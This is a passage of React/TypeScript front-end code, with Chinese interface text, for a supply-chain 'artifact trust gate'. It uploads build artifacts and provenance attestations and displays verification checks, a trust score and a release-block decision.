  const failCount = checks.filter((check) => check.status === 'fail').length
  const missingCount = checks.filter((check) => check.status === 'missing').length
  const warnCount = checks.filter((check) => check.status === 'warn').length
  const activeIssue = checks.find((check) => check.name === activeIssueId) ?? checks[0]
  const hasVerificationResult = Boolean(
    activeResult && (
      activeResult.scan_id ||
      activeResult.artifact ||
      activeResult.digest ||
      checks.length > 0
    )
  )
  const requiredFilesReady = artifactTrustRequiredFilesReady({
    artifactSelected: Boolean(artifactFile),
    attestationSelected: Boolean(attestationFile),
  })
  const optionalConfigured = Boolean(
    expectedRepo.trim() ||
    expectedCommit.trim() ||
    allowedWorkflows.trim() ||
    allowedBuilders.trim() ||
    requireSignature ||
    allowSelfHostedRunner
  )
  const readinessMessage = artifactTrustGateReadinessMessage({
    requiredReady: requiredFilesReady,
    optionalConfigured,
  })
  const selectedMaterialKey = `${artifactFile?.name ?? ''}|${attestationFile?.name ?? ''}`
  function handleIssueClick(issueId: string) { setActiveIssueId(issueId) }

  async function verifyGate() {
    if (!requiredFilesReady) {
      toast.error('请先补充产物文件和来源证明')
      return false
    }
    setScanning(true)
    try {
      const next = await uploadArtifactTrustScan({ workspaceId, artifact: artifactFile, attestation: attestationFile, expectedRepo, expectedCommit, allowedWorkflows: splitPolicyList(allowedWorkflows), allowedBuilders: splitPolicyList(allowedBuilders), requireSignature, requireProvenance: true, allowSelfHostedRunner, maxAgeHours: 24 })
      setLastUploadedScanId(next.scan_id ?? null)
      setLastUploadedMaterialKey(selectedMaterialKey)
      await onScanned(next)
      return true
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '产物可信验证失败')
      return false
    } finally { setScanning(false) }
  }

  async function confirmSupplement() {
    const ok = await verifyGate()
    if (ok) setSupplementOpen(false)
  }

  return <div className='min-w-0 space-y-4'>
    <section className='rounded-md border border-border bg-[color:var(--surface-card)] p-4'>
      <div className='flex flex-wrap items-start justify-between gap-4'>
        <div className='min-w-0'>
          <div className='flex items-center gap-3'>
            <span className='grid size-9 place-items-center rounded-md border border-cyan-300/25 bg-cyan-400/10 text-cyan-700 dark:text-cyan-100'>
              <Fingerprint className='size-5' />
            </span>
            <h2 className='text-page-title text-page-title-on-dark'>产物可信门禁</h2>
          </div>
          <div className='mt-2 h-px w-56 bg-gradient-to-r from-cyan-300/55 via-cyan-300/20 to-transparent' />
          <div className='mt-3 flex flex-wrap items-center gap-2'>
            {hasVerificationResult ? (
              <>
                <span className='meta-chip-dark' title={activeResult?.artifact}>{artifactFile?.name ?? activeResult?.artifact}</span>
                <span className='meta-chip-dark' title={activeResult?.digest}>{activeResult?.digest ? shortDigest(activeResult.digest) : 'Digest 未提供'}</span>
                <span className='meta-chip-dark'>{activeResult?.provenance.workflow ? compactWorkflowPath(activeResult.provenance.workflow) : '来源待确认'}</span>
              </>
            ) : (
              <span className='inline-flex items-center rounded-full border border-amber-400/30 bg-amber-400/10 px-2.5 py-1 text-xs font-semibold text-amber-700 dark:text-amber-200'>等待验证材料</span>
            )}
          </div>
        </div>
        {hasVerificationResult ? (
          <div className='flex flex-wrap gap-2'>
            <Button className={actionButtonClass} size='sm' onClick={() => setSupplementOpen(true)}><Plus className='size-4' />补充文件</Button>
            <Button variant='outline' size='sm' onClick={() => activeResult?.report ? downloadReport(activeResult.report) : toast.error('暂无可导出的验证报告')}><Download className='size-4' />导出报告</Button>
          </div>
        ) : null}
      </div>
    </section>

    <Dialog open={supplementOpen} onOpenChange={setSupplementOpen}>
      <DialogContent className='max-h-[88vh] max-w-3xl overflow-y-auto rounded-md border-slate-400/15 bg-[color:var(--surface-card)]'>
        <ArtifactSupplementDialogContent
          readinessMessage={readinessMessage}
          expectedRepo={expectedRepo}
          expectedCommit={expectedCommit}
          allowedWorkflows={allowedWorkflows}
          allowedBuilders={allowedBuilders}
          scanning={scanning}
          requiredFilesReady={requiredFilesReady}
          onArtifactFile={setArtifactFile}
          onAttestationFile={setAttestationFile}
          onExpectedRepo={setExpectedRepo}
          onExpectedCommit={setExpectedCommit}
          onAllowedWorkflows={setAllowedWorkflows}
          onAllowedBuilders={setAllowedBuilders}
          onCancel={() => setSupplementOpen(false)}
          onConfirm={() => void confirmSupplement()}
        />
      </DialogContent>
    </Dialog>

    {hasVerificationResult ? (
      <div className='space-y-4'>
        <ArtifactGateOverviewCard
          score={score}
          displayedScore={displayedScore}
          result={activeResult}
          failCount={failCount}
          missingCount={missingCount}
          warnCount={warnCount}
        />
        <div className='grid min-w-0 gap-4 xl:grid-cols-[minmax(0,1.6fr)_minmax(340px,0.9fr)]'>
          <ArtifactIssueList
            checks={checks}
            totalCount={checks.length}
            selectedCheck={activeIssue}
            onSelect={handleIssueClick}
          />
          <ArtifactIssueDetailPanel
            check={activeIssue}
            totalCount={checks.length}
          />
        </div>
      </div>
    ) : (
      <ArtifactTrustEmptyState
        scanning={scanning}
        onUpload={() => setSupplementOpen(true)}
      />
    )}

  </div>
}

function ArtifactTrustEmptyState({
  scanning,
  onUpload,
}: {
  scanning: boolean
  onUpload: () => void
}) {
  const materials = [
    { label: '构建产物', detail: '必填', icon: PackageCheck },
    { label: 'Provenance', detail: '必填', icon: FileText },
    { label: '签名信息', detail: '按策略验证', icon: Fingerprint },
    { label: '可信策略', detail: '可选配置', icon: ShieldCheck },
  ]

  return (
    <section className='overflow-hidden rounded-md border border-border bg-[color:var(--surface-card)]'>
      <div className='mx-auto flex min-h-[390px] max-w-3xl flex-col items-center justify-center px-6 py-14 text-center'>
        <span className='grid size-14 place-items-center rounded-md border border-cyan-400/25 bg-cyan-500/10 text-cyan-700 dark:text-cyan-200'>
          <PackageCheck className='size-7' />
        </span>
        <h3 className='mt-5 text-xl font-bold text-foreground'>尚未上传待验证产物</h3>
        <p className='mt-2 max-w-xl text-sm leading-6 text-muted-foreground'>
          上传构建产物及对应的 Attestation 或 Provenance，系统将在材料齐全后生成门禁结论。
        </p>
        <Button className={cn(actionButtonClass, 'mt-6')} onClick={onUpload} disabled={scanning}>
          {scanning ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
          上传验证材料
        </Button>
      </div>
      <div className='grid border-t border-border bg-[color:var(--surface-inset)] sm:grid-cols-2 xl:grid-cols-4'>
        {materials.map((material) => {
          const Icon = material.icon
          return (
            <div key={material.label} className='flex items-center gap-3 border-b border-border px-5 py-4 last:border-b-0 sm:border-r xl:border-b-0'>
              <Icon className='size-4 shrink-0 text-cyan-700 dark:text-cyan-300' />
              <div className='min-w-0'>
                <div className='text-xs font-semibold text-foreground'>{material.label}</div>
                <div className='mt-1 text-xs text-muted-foreground'>{material.detail}</div>
              </div>
            </div>
          )
        })}
      </div>
    </section>
  )
}

type ArtifactTrustScoreSource = 'fresh' | 'pending' | 'previous' | 'preview' | 'empty'

function ArtifactSupplementDialogContent({
  readinessMessage,
  expectedRepo,
  expectedCommit,
  allowedWorkflows,
  allowedBuilders,
  scanning,
  requiredFilesReady,
  onArtifactFile,
  onAttestationFile,
  onExpectedRepo,
  onExpectedCommit,
  onAllowedWorkflows,
  onAllowedBuilders,
  onCancel,
  onConfirm,
}: {
  readinessMessage: string
  expectedRepo: string
  expectedCommit: string
  allowedWorkflows: string
  allowedBuilders: string
  scanning: boolean
  requiredFilesReady: boolean
  onArtifactFile: (file: File | null) => void
  onAttestationFile: (file: File | null) => void
  onExpectedRepo: (value: string) => void
  onExpectedCommit: (value: string) => void
  onAllowedWorkflows: (value: string) => void
  onAllowedBuilders: (value: string) => void
  onCancel: () => void
  onConfirm: () => void
}) {
  return (
    <>
      <DialogHeader>
        <DialogTitle className='flex items-center gap-2 text-section-title text-foreground'><Upload className='size-5 text-cyan-300' />{SUPPLEMENT_FILE_INPUT_TITLE}</DialogTitle>
        <DialogDescription className='text-sm text-muted-foreground'>{readinessMessage}</DialogDescription>
      </DialogHeader>
      <div className='space-y-4'>
        <div className='space-y-3'>
          <div className='rounded-md border border-cyan-300/20 bg-cyan-400/5 p-3'>
            <div className='flex flex-wrap items-center justify-between gap-2'>
              <Label htmlFor='artifact-required-file' className='text-sm font-bold text-foreground'>Artifact 产物文件</Label>
              <span className='rounded-md border border-red-300/30 bg-red-400/10 px-2 py-1 text-xs font-bold text-red-700 dark:text-red-100'>必填</span>
            </div>
            <Input
              id='artifact-required-file'
              aria-label='Artifact 产物文件'
              type='file'
              className={cn(fileInputClass, 'mt-3')}
              onChange={event => onArtifactFile(event.target.files?.[0] ?? null)}
            />
          </div>
          <div className='rounded-md border border-amber-300/20 bg-amber-400/5 p-3'>
            <div className='flex flex-wrap items-center justify-between gap-2'>
              <Label htmlFor='attestation-required-file' className='text-sm font-bold text-foreground'>Attestation / Provenance 来源证明</Label>
              <span className='rounded-md border border-red-300/30 bg-red-400/10 px-2 py-1 text-xs font-bold text-red-700 dark:text-red-100'>必填</span>
            </div>
            <Input
              id='attestation-required-file'
              aria-label='Attestation / Provenance 来源证明'
              type='file'
              accept='.json,.jsonl,application/json'
              className={cn(fileInputClass, 'mt-3')}
              onChange={event => onAttestationFile(event.target.files?.[0] ?? null)}
            />
          </div>
        </div>
        <div className='space-y-2 rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-3'>
          <Input placeholder='可信源码仓库（选填）' value={expectedRepo} onChange={event => onExpectedRepo(event.target.value)} />
          <Input placeholder='预期 commit（选填）' value={expectedCommit} onChange={event => onExpectedCommit(event.target.value)} />
          <Input placeholder='允许 workflow（选填）' value={allowedWorkflows} onChange={event => onAllowedWorkflows(event.target.value)} />
          <Input placeholder='可信 builder（选填）' value={allowedBuilders} onChange={event => onAllowedBuilders(event.target.value)} />
        </div>
      </div>
      <DialogFooter>
        <Button variant='outline' onClick={onCancel}>取消</Button>
        <Button className={actionButtonClass} onClick={onConfirm} disabled={scanning || !requiredFilesReady}>
          {scanning ? <Loader2 className='animate-spin' /> : <Upload />}
          {scanning ? '正在验证' : '确认'}
        </Button>
      </DialogFooter>
    </>
  )
}

function ArtifactGateOverviewCard({
  score,
  displayedScore,
  result,
  failCount,
  missingCount,
  warnCount,
}: {
  score: number
  displayedScore: number
  result?: ArtifactTrustResult
  failCount: number
  missingCount: number
  warnCount: number
}) {
  const passCount = result?.summary?.passed ?? result?.checks.filter((check) => check.status === 'pass').length ?? 0
  const statusData = [
    { label: '失败', value: failCount, color: 'bg-red-500' },
    { label: '缺失', value: missingCount, color: 'bg-orange-500' },
    { label: '警告', value: warnCount, color: 'bg-amber-400' },
    { label: '通过', value: passCount, color: 'bg-emerald-500' },
  ]
  const statusTotal = Math.max(1, statusData.reduce((sum, item) => sum + item.value, 0))
  const scoreTone = score >= 90
    ? 'text-emerald-600 dark:text-emerald-300'
    : score >= 75
      ? 'text-amber-600 dark:text-amber-300'
      : score >= 55
        ? 'text-orange-600 dark:text-orange-300'
        : 'text-red-600 dark:text-red-300'
  const metrics = [
    { label: '验证项', value: result?.summary?.check_count ?? result?.checks.length ?? 0 },
    { label: '通过', value: passCount },
    { label: '失败/缺失', value: failCount + missingCount },
    { label: '警告', value: warnCount },
  ]

  return (
    <Card className='overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardContent className='p-0'>
        <div className='grid lg:grid-cols-[250px_minmax(0,1fr)]'>
          <div className='flex items-center gap-4 border-b border-border px-5 py-5 lg:border-r lg:border-b-0'>
            <span className='grid size-10 shrink-0 place-items-center rounded-md border border-cyan-400/25 bg-cyan-500/10 text-cyan-700 dark:text-cyan-200'>
              <Fingerprint className='size-5' />
            </span>
            <div className='min-w-0'>
              <div className='flex items-end gap-2'>
                <span className={cn('text-4xl font-bold leading-none tabular-nums', scoreTone)}>{displayedScore}</span>
                <span className='pb-0.5 text-xs font-medium text-muted-foreground'>/ 100</span>
              </div>
              <div className='mt-2 flex items-center gap-2'>
                <span className='text-xs font-semibold text-foreground'>可信评分</span>
                <ArtifactGateBadge score={score} />
              </div>
            </div>
          </div>

          <div className='min-w-0 px-5 py-4'>
            <div className='grid grid-cols-2 sm:grid-cols-4 sm:divide-x sm:divide-border'>
              {metrics.map((metric) => (
                <div key={metric.label} className='min-w-0 px-4 first:pl-0 last:pr-0'>
                  <div className='text-xs font-medium text-muted-foreground'>{metric.label}</div>
                  <div className='mt-1 text-2xl font-bold tabular-nums text-foreground'>{metric.value}</div>
                </div>
              ))}
            </div>
            <div className='mt-4 border-t border-border pt-3'>
              <div className='flex h-1.5 overflow-hidden rounded-full bg-[color:var(--muted)]'>
                {statusData.filter((item) => item.value > 0).map((item) => (
                  <span key={item.label} className={item.color} style={{ width: `${(item.value / statusTotal) * 100}%` }} />
                ))}
              </div>
              <div className='mt-2 flex flex-wrap items-center gap-x-5 gap-y-1 text-xs text-muted-foreground'>
                {statusData.map((item) => (
                  <span key={item.label} className='inline-flex items-center gap-1.5 tabular-nums'>
                    <span className={cn('size-2 rounded-sm', item.color)} />
                    {item.label} {item.value}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function ArtifactIssueList({
  checks,
  totalCount,
  selectedCheck,
  onSelect,
}: {
  checks: ArtifactTrustCheck[]
  totalCount: number
  selectedCheck?: ArtifactTrustCheck
  onSelect: (name: string) => void
}) {
  return (
    <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardHeader className='border-b border-border pb-3'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div className='min-w-0'>
            <div className='flex items-center gap-2'>
              <CardTitle className='text-section-title'>验证项目</CardTitle>
              <span className='meta-chip'>{checks.length}/{totalCount}</span>
            </div>
            <div className='mt-1 text-xs text-muted-foreground'>查看每项校验状态与关键证据</div>
          </div>
        </div>
      </CardHeader>
      <CardContent className='min-h-0 flex-1 p-0'>
        {checks.length ? (
          <div className='flex h-full min-h-0 flex-col'>
            <div className='hidden grid-cols-[minmax(0,1.15fr)_minmax(160px,0.85fr)_72px] gap-4 border-b border-border bg-[color:var(--surface-inset)] px-5 py-2 text-[11px] font-semibold text-muted-foreground md:grid'>
              <span>检查项</span>
              <span>关键证据</span>
              <span className='text-right'>状态</span>
            </div>
            <div className='min-h-0 flex-1 overflow-y-auto overscroll-contain [scrollbar-gutter:stable] [scrollbar-width:thin]'>
              {checks.map((check) => {
                const selected = check.name === selectedCheck?.name
                const severity = check.severity ? normalizeSeverity(check.severity) : undefined
                return (
                  <motion.button
                    key={check.name}
                    type='button'
                    layout
                    onClick={() => onSelect(check.name)}
                    className={cn(
                      'grid w-full grid-cols-[minmax(0,1fr)_auto] items-center gap-4 border-b border-border/70 px-5 py-3.5 text-left transition-colors md:grid-cols-[minmax(0,1.15fr)_minmax(160px,0.85fr)_72px]',
                      selected
                        ? 'bg-cyan-500/10 shadow-[inset_3px_0_0_rgb(6,182,212)]'
                        : 'hover:bg-[color:var(--surface-inset)]',
                    )}
                  >
                    <span className='flex min-w-0 items-center gap-3'>
                      {severity ? <SeverityPill severity={severity} /> : <span className='inline-flex h-[26px] min-w-[44px] items-center justify-center rounded-full border border-slate-300/30 px-2.5 text-[13px] font-bold text-muted-foreground'>信息</span>}
                      <span className='min-w-0'>
                        <span className='block truncate text-sm font-semibold text-foreground' title={artifactCheckTitle(check.name)}>{artifactCheckTitle(check.name)}</span>
                        <span className='mt-1 block truncate text-xs text-muted-foreground md:hidden'>{check.evidence || '暂无证据摘要'}</span>
                      </span>
                    </span>
                    <span className='hidden truncate text-xs text-muted-foreground md:block' title={check.evidence || ''}>{check.evidence || '暂无证据摘要'}</span>
                    <span className={cn('inline-flex h-6 items-center justify-center rounded-full border px-2 text-xs font-bold', artifactCheckClass(check.status))}>{artifactCheckLabel(check.status)}</span>
                  </motion.button>
                )
              })}
            </div>
          </div>
        ) : (
          <div className='grid h-full place-items-center p-6 text-center text-sm text-muted-foreground'>暂无验证项目</div>
        )}
      </CardContent>
    </Card>
  )
}

function ArtifactIssueDetailPanel({
  check,
  totalCount,
}: {
  check?: ArtifactTrustCheck
  totalCount: number
}) {
  if (!check) {
    return (
      <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
        <CardHeader className='border-b border-border pb-3'>
          <CardTitle className='min-w-0 truncate text-base text-foreground'>验证详情</CardTitle>
        </CardHeader>
        <CardContent className='min-w-0 flex-1 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
          <div className='rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-6 text-center text-sm text-muted-foreground'>
            {totalCount ? '选择左侧验证项目查看证据。' : '当前没有可查看的验证项目。'}
          </div>
        </CardContent>
      </Card>
    )
  }
  const detail = artifactCheckExplanation(check)
  const severity = check.severity ? normalizeSeverity(check.severity) : undefined

  return (
    <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardHeader className='border-b border-border pb-3'>
        <CardTitle className='min-w-0 text-base leading-6 text-foreground' title={artifactCheckTitle(check.name)}>
          {artifactCheckTitle(check.name)}
        </CardTitle>
        <div className='mt-1 truncate font-mono text-xs text-muted-foreground' title={check.name}>{check.name}</div>
      </CardHeader>
      <CardContent className='min-w-0 flex-1 space-y-3 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
        <div className='flex flex-wrap gap-2'>
          <span className={cn('inline-flex h-[26px] min-w-[44px] shrink-0 items-center justify-center rounded-full border px-2.5 text-[13px] font-bold leading-none', artifactCheckClass(check.status))}>
            {artifactCheckLabel(check.status)}
          </span>
          {severity ? <SeverityPill severity={severity} /> : null}
          <span className='rounded-full border border-cyan-300/25 bg-cyan-400/10 px-2 py-0.5 text-xs font-medium text-cyan-700 dark:text-cyan-100'>
            Artifact Gate
          </span>
        </div>
        <div className='grid gap-2 text-sm'>
          <DetailRow label='状态' value={artifactCheckLabel(check.status)} />
          <DetailRow label='风险等级' value={severity ? severityLabel(severity) : '信息'} />
          <DetailRow label='关联检查' value={check.name} />
        </div>
        <CicdInfoBlock title='风险原因' text={detail.impact} />
        <CicdInfoBlock title='关键证据' text={check.evidence || '-'} mono />
        <CicdInfoBlock title='修复建议' text={detail.action} tone='action' />
      </CardContent>
    </Card>
  )
}

function ArtifactTrustScoreSourceBar({
  result,
  source,
  artifactName,
  attestationName,
}: {
  result?: ArtifactTrustResult
  source: ArtifactTrustScoreSource
  artifactName?: string
  attestationName?: string
}) {
  const sourceLabel =
    source === 'fresh'
      ? '评分来源：刚刚上传验证'
      : source === 'pending'
        ? '已选择新材料，当前分数仍来自上次扫描'
        : source === 'preview'
          ? '评分来源：预览数据'
          : source === 'previous'
            ? '评分来源：上次扫描结果'
            : '评分来源：暂无门禁评分'
  const sourceClass =
    source === 'fresh'
      ? 'border-emerald-300/30 bg-emerald-400/10 text-emerald-100'
      : source === 'pending'
        ? 'border-amber-300/30 bg-amber-400/10 text-amber-100'
        : 'border-slate-300/20 bg-[color:var(--surface-inset)] text-muted-foreground'
  const rows = [
    ['scan_id', result?.scan_id || '-'],
    ['Artifact', artifactName || artifactTrustDisplayName(result?.artifact || result?.artifact_path) || '-'],
    ['Attestation', attestationName || artifactTrustDisplayName(result?.attestation_path) || '-'],
    ['生成时间', formatArtifactTrustGeneratedAt(result?.generated_at)],
  ]

  return (
    <div className={cn('rounded-md border px-3 py-3', sourceClass)}>
      <div className='flex flex-wrap items-center justify-between gap-2'>
        <span className='text-sm font-bold'>{sourceLabel}</span>
        <span className='rounded-md border border-current/20 px-2 py-1 text-xs font-bold'>
          {result?.trust_score ?? result?.trustScore ?? result?.summary?.trust_score ?? 0}/100
        </span>
      </div>
      <div className='mt-3 grid gap-2 text-xs sm:grid-cols-2'>
        {rows.map(([label, value]) => (
          <div key={label} className='min-w-0 rounded-md border border-current/10 bg-background/10 px-2 py-1.5'>
            <span className='mr-2 text-muted-foreground'>{label}</span>
            <span className='break-all font-medium text-foreground'>{value}</span>
          </div>
        ))}
      </div>
    </div>
  )
}

function artifactTrustDisplayName(value?: string | null) {
  const text = String(value || '').trim()
  if (!text) return ''
  const parts = text.replace(/\\/g, '/').split('/').filter(Boolean)
  return parts.at(-1) || text
}

function formatArtifactTrustGeneratedAt(value?: string | null) {
  return formatLocalDateTime(value, { includeSeconds: true })
}

type EvidenceKey = 'artifact' | 'digest' | 'signature' | 'attestation' | 'provenance' | 'policy'
type ArtifactDetail = { title: string; rows: Array<[string, string]>; evidence?: string; advice?: string; severity?: SecuritySeverity }

function getEvidenceDetail(key: EvidenceKey, result: ArtifactTrustResult | undefined, input: { artifactName?: string; attestationName?: string; expectedRepo: string; expectedCommit: string; allowedWorkflows: string; allowedBuilders: string; requireSignature: boolean; allowSelfHostedRunner: boolean; score: number }): ArtifactDetail {
  const check = (name: string) => result?.checks.find((item) => item.name === name)
  if (key === 'artifact') return { title: '当前证据 · Artifact', rows: [['文件名', input.artifactName || result?.artifact || '待上传'], ['上传状态', input.artifactName ? '已选择，待验证' : result?.artifact ? '已识别' : '待上传'], ['Digest', result?.digest || '待计算'], ['识别状态', result?.artifact ? '已识别' : '未提供']] }
  if (key === 'digest') return { title: '当前证据 · Digest', rows: [['Digest', result?.digest || '待计算'], ['Subject 匹配', artifactCheckLabel(check('artifact_digest_matches_subject')?.status || 'missing')]], evidence: check('artifact_digest_matches_subject')?.evidence || '未提供 digest 匹配证据' }
  if (key === 'signature') return { title: '当前证据 · Signature', rows: [['验签状态', artifactCheckLabel(check('signature_verified')?.status || 'missing')], ['材料状态', input.attestationName ? 'Attestation 已选择' : '待上传签名材料']], evidence: check('signature_verified')?.evidence || '缺少签名验签材料', advice: '上传签名或包含签名的 attestation 后重新验证。', severity: 'high' }
  if (key === 'attestation') return { title: '当前证据 · Attestation', rows: [['解析状态', result?.attestation_path ? '已解析' : input.attestationName ? '已选择，待解析' : '待上传'], ['策略时效', '24 小时'], ['校验结果', artifactCheckLabel(check('attestation_max_age')?.status || 'missing')]], evidence: check('attestation_max_age')?.evidence || '未提供 attestation 时效证据', advice: '重新生成有效时限内的 attestation。', severity: 'medium' }
  if (key === 'provenance') return { title: '当前证据 · Provenance', rows: [['Repo', result?.provenance.source_repo || '未解析'], ['Commit', result?.provenance.commit || '未解析'], ['Workflow', result?.provenance.workflow || '未解析'], ['Builder', result?.provenance.builder_id || '未解析'], ['Predicate', result?.provenance.predicateType || result?.provenance.predicate_type || '未解析']] }
  return { title: '当前证据 · Policy', rows: [['要求签名', input.requireSignature ? '已启用' : '未启用'], ['Self-hosted runner', input.allowSelfHostedRunner ? '允许' : '禁止'], ['允许 workflow', input.allowedWorkflows || '未配置'], ['可信 builder', input.allowedBuilders || '未配置'], ['门禁结论', input.score >= 90 ? '允许发布' : '建议阻断']] }
}
function getIssueDetail(check: ArtifactTrustCheck): ArtifactDetail { const detail = artifactCheckExplanation(check); return { title: artifactCheckTitle(check.name), rows: [['状态', artifactCheckLabel(check.status)], ['风险等级', check.severity ? severityLabel(check.severity as SecuritySeverity) : '信息'], ['关联检查', check.name]], evidence: check.evidence || '未提供', advice: detail.action, severity: check.severity as SecuritySeverity } }
function ArtifactDetailPanel({ detail }: { detail: ArtifactDetail }) { return <><h2 className='text-section-title !text-[20px]'>{detail.title}</h2><div className='space-y-2'>{detail.rows.map(([label, value]) => <div key={label} className='grid min-w-0 grid-cols-[88px_minmax(0,1fr)] items-center gap-3 rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] px-3 py-2.5'><span className='whitespace-nowrap text-label font-bold'>{label}</span><span className='min-w-0 truncate text-right text-value' title={value}>{value}</span></div>)}</div>{detail.evidence ? <div className='code-evidence mt-4 truncate px-3 py-2.5' title={detail.evidence}>{detail.evidence}</div> : null}{detail.advice ? <div className='action-advice mt-4 p-4'><div className='font-bold'>建议修复</div><div className='mt-1 line-clamp-2 leading-6' title={detail.advice}>{detail.advice}</div></div> : null}</> }

function ArtifactGateBadge({ score }: { score: number }) { const blocked = score < 90; return <span className={cn('inline-flex h-7 items-center rounded-full border px-3 text-sm font-bold', blocked ? 'border-red-400/35 bg-red-500/10 text-red-200' : 'border-emerald-400/35 bg-emerald-500/10 text-emerald-200')}>{blocked ? '建议阻断' : '允许发布'}</span> }
function GateMetric({ label, value }: { label: string; value: number }) { return <div className='rounded-md border border-border bg-[color:var(--surface-inset)] px-2 py-2'><div className='text-label'>{label}</div><div className='mt-1 text-xl font-extrabold text-foreground'>{value}</div></div> }
function ArtifactGateCheck({ check, selected, onSelect, compact = false }: { check: ArtifactTrustCheck; selected: boolean; onSelect: () => void; compact?: boolean }) { const detail = artifactCheckExplanation(check); return <button type='button' onClick={onSelect} className={cn('w-full rounded-md border p-5 text-left transition hover:-translate-y-0.5', selected ? 'border-cyan-300/45 bg-cyan-400/10' : 'border-slate-400/12 bg-[color:var(--surface-inset)] hover:border-slate-300/30')}><div className='flex items-center justify-between gap-3'><div className='min-w-0'><span className='text-card-title !text-[17px]'>{artifactCheckTitle(check.name)}</span><div className='mt-3 truncate code-evidence px-3 py-2' title={check.evidence}>{check.evidence || '未提供'}</div></div><span className={cn('shrink-0 inline-flex h-6 items-center rounded-full border px-2 text-xs font-bold', artifactCheckClass(check.status))}>{artifactCheckLabel(check.status)}</span></div>{selected && !compact ? <div className='action-advice mt-4 p-4'><span className='font-bold'>建议修复</span><div className='mt-1 line-clamp-2 leading-6' title={detail.action}>{detail.action}</div></div> : null}</button> }
function artifactTrustNodes(result: ArtifactTrustResult | undefined, score: number) { const check = (name: string) => result?.checks.find(item => item.name === name); const node = (id: string, label: string, icon: LucideIcon, status: string, className: string, badgeClass: string) => ({ id, label, icon, status, className, badgeClass }); const signature = check('signature_verified'); const attestation = check('attestation_max_age'); return [node('artifact', 'Artifact', Archive, result?.artifact ? '已识别' : '待上传', 'text-cyan-200', 'border-cyan-400/30 text-cyan-200'), node('digest', 'Digest', Fingerprint, check('artifact_digest_matches_subject')?.status === 'fail' ? '失败' : '通过', 'text-emerald-200', 'border-emerald-400/30 text-emerald-200'), node('signature', 'Signature', KeyRound, artifactCheckLabel(signature?.status || 'missing'), 'text-red-200', artifactCheckClass(signature?.status || 'missing')), node('attestation', 'Attestation', FileText, artifactCheckLabel(attestation?.status || 'missing'), 'text-amber-200', artifactCheckClass(attestation?.status || 'missing')), node('provenance', 'Provenance', GitBranch, result?.provenance.commit ? '通过' : '缺失', 'text-cyan-200', 'border-cyan-400/30 text-cyan-200'), node('policy', 'Policy', ShieldCheck, '已加载', 'text-amber-200', 'border-amber-400/30 text-amber-200'), node('gate', 'Release Gate', ShieldAlert, score >= 90 ? '允许' : '阻断', score >= 90 ? 'text-emerald-200' : 'text-red-200', score >= 90 ? 'border-emerald-400/30 text-emerald-200' : 'border-red-400/30 text-red-200')] }

function ArtifactConfigSummary({ label, value }: { label: string; value?: string }) {
  return (
    <div className='rounded-md border bg-muted/20 px-3 py-2 text-sm'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className='mt-1 truncate font-medium'>{value || '-'}</div>
    </div>
  )
}

function ArtifactTrustCheckCard({
  check,
  important = false,
}: {
  check: ArtifactTrustCheck
  important?: boolean
}) {
  const explanation = artifactCheckExplanation(check)
  return (
    <div className={cn('rounded-md border p-3', important && 'border-red-200 bg-red-50/40 dark:border-red-900 dark:bg-red-950/15')}>
      <div className='flex flex-wrap items-start justify-between gap-2'>
        <div className='min-w-0'>
          <div className='flex flex-wrap items-center gap-2'>
            <Badge variant='outline' className={cn('rounded-md', artifactCheckClass(check.status))}>
              {artifactCheckLabel(check.status)}
            </Badge>
            <span className='font-medium'>{artifactCheckTitle(check.name)}</span>
          </div>
          <div className='mt-1 font-mono text-xs text-muted-foreground'>{check.name}</div>
        </div>
        <Badge variant='outline' className='rounded-md'>
          {check.severity ? severityLabel(check.severity as SecuritySeverity) : '信息'}
        </Badge>
      </div>
      <div className='mt-3 grid gap-3 md:grid-cols-3'>
        <CicdInfoBlock title='影响说明' text={explanation.impact} />
        <CicdInfoBlock title='关键证据' text={truncateMiddle(check.evidence || '-', 110)} mono />
        <CicdInfoBlock title='建议动作' text={explanation.action} />
      </div>
    </div>
  )
}

function ArtifactTrustFindingCard({ finding }: { finding: ArtifactTrustFinding }) {
  const summary = artifactFindingSummary(finding)
  return (
    <div className='min-w-0 max-w-full overflow-hidden rounded-md border border-red-500/55 bg-red-950/10 p-4'>
      <div className='flex min-w-0 items-start justify-between gap-3'>
        <div className='flex min-w-0 items-center gap-2'>
          <AlertTriangle className='mt-0.5 size-4 shrink-0 text-red-500' />
          <div className='min-w-0 break-words text-base font-semibold leading-6 [overflow-wrap:anywhere]'>
            {artifactFindingTitle(finding)}
          </div>
        </div>
        <Badge variant='outline' className={cn('shrink-0 rounded-md', severityClasses[finding.severity])}>
          {severityLabel(finding.severity)}
        </Badge>
      </div>
      <div
        className='mt-3 min-w-0 max-w-full whitespace-pre-wrap break-all rounded-md bg-background/45 p-3 text-sm leading-7 text-muted-foreground [overflow-wrap:anywhere] [word-break:break-all]'
        title={summary}
        style={{ overflowWrap: 'anywhere', wordBreak: 'break-all' }}
      >
        {summary}
      </div>
      <div className='mt-2 min-w-0 space-y-2 overflow-hidden'>
        <Collapsible>
          <CollapsibleTrigger asChild>
            <Button variant='ghost' size='sm' className='h-7 px-2 text-xs'>
              查看原始证据
              <ChevronDown className='size-3.5' />
            </Button>
          </CollapsibleTrigger>
          <CollapsibleContent className='mt-2 space-y-2'>
            <div
